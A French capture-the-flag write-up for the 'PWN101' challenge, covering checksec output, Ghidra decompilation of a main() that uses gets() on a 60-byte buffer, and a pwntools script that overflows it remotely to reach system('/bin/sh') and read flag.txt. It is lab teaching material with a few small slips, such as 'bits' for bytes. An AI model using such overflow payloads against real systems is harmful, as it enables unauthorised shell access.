# PWN101 challenge

## basic check

checksec --file=pwn101-1644307211706.pwn101
RLEO : full releo
STACK CANARY : No canary found
NX : NX enabled
PIE : PIE enabled

> pas de protection canary donc on peut executer une attaque buffer overflow

## executer le fichier

chmod + pwn101-1644307211706.pwn101
./pwn101-1644307211706.pwn101

     ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:
AAAAAAAAAAAAA
Nah bruh, you lied me :(
She did Tomato rice instead of briyani :/

## utiliser ghidra pour dessasembler le code

void main(void)

{
  char local_48 [60];
  int local_c;
  
  local_c = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(local_48);
  if (local_c == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /*WARNING: Subroutine does not return*/
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}

## resumé du main

Setup et affichage de bannière

Lit une chaîne utilisateur avec gets() dans une variable locale

Compare une variable locale initialisée à 1337

Si égal →affiche message erreur et quitte

Sinon →affiche message, exécute une commande shell via system() affiche message erreur et quitte avec code 1337

## approche de l'exploit

Dans le code on va saisir une chaine avec la fonction gets () qui est une fonction vulnerable
donc on va preparer un payload de taille +> 60 bits pour reecrire une autre valeur dans la variable locale
local_c

from pwn import *
host = "adresse de la machine "
port = 9001

io = remote(host, port)
payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB"
io.sendline(payload)
io.interactive()

## conexion au serveur a distance

nc @machine 9001
entrer le payload
un shell va s'ouvrir
ls
cat flag.txt
obtenir le flag
